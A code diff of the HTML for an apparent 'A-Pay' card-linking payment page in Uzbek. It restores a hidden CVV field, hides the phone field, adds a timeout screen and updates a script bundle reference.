@@ -7,7 +7,7 @@
     <meta http-equiv="X-UA-Compatible" content="ie=edge">
     <title>A-Pay: картани бириктириш</title>
     <link rel="icon" type="image/png" sizes="16x16" href="./assets/favicon.png">
-<link href="css/bundle.css?ver=1743168035483" rel="stylesheet"></head>
+</head>
 <body>
     <svg style="position: absolute; top: -1000px; left: -1000px; pointer-events: none; opacity: 0">
         <!--LOGO-->
@@ -206,17 +206,17 @@
                                         </div>
                                     </label>
                                 </div>
-            <!--                    <div class="form__field">-->
-            <!--                        <label>-->
-            <!--                            <div class="form__field-label">-->
-            <!--                                <span>CVV</span>-->
-            <!--                            </div>-->
-            <!--                            <input type="text" name="cvv" placeholder="000" size="3" maxlength="3" class="input-cvv">-->
-            <!--                        </label>-->
-            <!--                    </div>-->
+                                <div class="form__field form__field-cvv d-none">
+                                    <label>
+                                        <div class="form__field-label">
+                                            <span>CVV</span>
+                                        </div>
+                                        <input type="text" name="cvv" placeholder="000" size="3" maxlength="3" class="input-cvv">
+                                    </label>
+                                </div>
                             </div>
                             <div class="form__group">
-                                <div class="form__field">
+                                <div class="form__field form__field-phone d-none">
                                     <label>
                                         <div class="form__field-label">
                                             <span>Телефон рақами</span>
@@ -278,6 +278,17 @@
                             </div>
                         </div>
                     </div>
+                    <div class="form__step" data-step="timeout">
+                        <div class="form-container">
+                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <use xlink:href="#closeIcon"/>
+                            </svg>
+                            <div class="form-container__title">
+                                <span>Кутиш вақти тугади.</span>
+                            </div>
+                            <button class="lp-button primary bold">Қайта текшириш</button>
+                        </div>
+                    </div>
                 </div>
             </div>            <footer class="footer">
                 <div class="footer__left">
@@ -299,5 +310,5 @@
         <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
             <use xlink:href="#spinner"/>
         </svg>
-    </div><script src="js/bundle.min.js?ver=1743168035231"></script></body>
+    </div><script src="js/bundle.min.js?ver=1747894630522"></script></body>
 </html>
